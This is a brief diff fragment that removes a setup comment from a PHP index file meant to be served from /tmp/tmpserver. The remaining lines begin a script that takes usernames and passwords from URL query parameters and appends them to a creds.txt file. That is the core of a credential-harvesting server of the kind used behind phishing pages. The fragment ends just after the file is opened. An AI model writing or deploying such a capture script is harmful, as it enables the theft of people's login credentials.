@@ -1,5 +1,3 @@
-#Create a file called index.php and place it in '/tmp/tmpserver/index.php
-
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
     $file = fopen("creds.txt", "a+");
